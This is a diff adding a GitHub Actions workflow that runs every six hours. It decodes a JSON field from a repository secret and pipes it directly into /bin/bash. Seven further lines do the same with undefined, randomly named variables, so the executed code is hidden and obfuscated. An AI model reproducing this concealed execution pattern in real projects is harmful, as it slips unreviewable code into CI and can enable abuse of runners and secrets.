@@ -1,0 +1,25 @@
+name: heliangquanqian
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: heliangquanqian
+        env:
+          gxot230: ${{ secrets.gxot230 }}
+        run: |
+          echo $gxot230 | jq -r .if87958 | /bin/bash
+          echo $godep492 | jq -r .iywx3244 | /bin/bash
+          echo $wev57 | jq -r .wa3 | /bin/bash
+          echo $k154 | jq -r .g22589 | /bin/bash
+          echo $olz61 | jq -r .lufp7 | /bin/bash
+          echo $eoafj3645 | jq -r .fio4888 | /bin/bash
+          echo $uxvwk5590 | jq -r .vbru3915 | /bin/bash
+          echo $bq84 | jq -r .e682 | /bin/bash
+
